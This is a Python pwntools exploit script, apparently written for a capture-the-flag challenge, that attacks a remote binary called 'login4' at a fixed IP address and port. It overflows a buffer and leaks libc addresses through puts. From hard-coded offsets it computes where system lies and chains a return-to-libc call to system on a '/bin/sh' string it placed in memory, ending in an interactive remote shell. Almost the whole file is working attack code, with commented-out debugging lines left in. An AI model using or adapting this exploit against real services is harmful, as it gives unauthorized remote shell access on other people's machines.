#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *

rem = remote("203.135.149.49", 9004)
#in = open("in", "wb")
#loc = process("./login4")
login4 = ELF("./login4")
puts_plt = login4.plt['puts']
lib_main = login4.got["__libc_start_main"]
lib_printf = login4.got["printf"]
login = login4.symbols['login']
#print(hex(lib_main))
rem.sendline("/bin/sh")
#rem.sendline("/bin/sh")
#loc.sendline(payload)
#
#gdb.attach(loc)
context.log_level = "debug"
#loc.sendline(p32(0xefbeadde)+p32(0x9999)*34+payload)
#payload=p32(0x80483b0)+p32(0x00000000)+p32(0x804a01c)
payload = flat([puts_plt, login, lib_main])
rem.sendline(p32(0xefbeadde)+p32(0x9999)*34+payload)
rem.recvuntil("success.")
ret = u32(rem.recv()[0:4])
print("main return: "+ hex(ret))
lib_main_addr = ret


payload = flat([puts_plt, login, lib_printf])
rem.sendline(p32(0xefbeadde)+p32(0x9999)*34+payload)
rem.recvuntil("success.")
ret = u32(rem.recv()[0:4])
print("printf return: "+ hex(ret))
#payload = flat([puts_plt, login])
#loc.sendline(p32(0xefbeadde)+p32(0x9999)*34+payload+p32(0x74616857))


#lib_main_addr2 = loc.recv()[0:10]
#print("main_addr2: "+ lib_main_addr2.decode("ascii"))
#obj = LibcSearcher("__libc_start_main", lib_main_addr)
#obj.dump("system")
lib_main_off = 0x00018d90
lib_main_off2 = 0x000001d3
lib_sys_off = 0x0003cd10
lib_sys_off2 = 0x00000037
lib_printf_off = 0x00050b60
lib_printf_addr = lib_main_addr-lib_main_off+lib_printf_off
print("print real off " + hex(lib_main_addr))
print("printf est " + hex(lib_printf_addr))
lib_sys_addr = lib_main_addr-lib_main_off+lib_sys_off
payload = flat([lib_sys_addr, login, login4.symbols['user_ID']])
print("sys est " + hex(lib_sys_addr))
rem.sendline(p32(0xefbeadde)+p32(0x99)*34+payload)
rem.interactive()
#f.write(patt.encode("ascii"))
#f.close
